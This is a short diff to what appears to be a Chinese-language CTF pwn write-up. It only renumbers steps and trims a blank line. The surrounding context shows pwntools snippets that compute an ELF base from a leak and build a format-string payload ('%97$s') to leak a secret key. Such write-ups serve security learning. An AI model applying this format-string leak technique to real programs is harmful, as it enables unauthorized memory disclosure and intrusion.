@@ -64,7 +64,7 @@ elf_base = int(io.recv(), 16) - 0x3272
 lg("elf_base", elf_base)
 ```
 
-1. 再把目标地址写到缓冲区里，调试定位缓冲区
+2. 再把目标地址写到缓冲区里，调试定位缓冲区
 
 ```python
 payload = get_payload(b"a" * 7 + p64(elf_base + 0x5040) * 3)
@@ -72,7 +72,7 @@ s(payload)
 ru(b"DEBUG: ")
 ```
 
-1. 最后用 `%s` 偷出 `secert_key`
+3. 最后用 `%s` 偷出 `secert_key`
 
 ```python
 payload = get_payload(b"%97$s")
@@ -137,4 +137,3 @@ unused:
 # lg("canary", canary)
 """
 ```
-
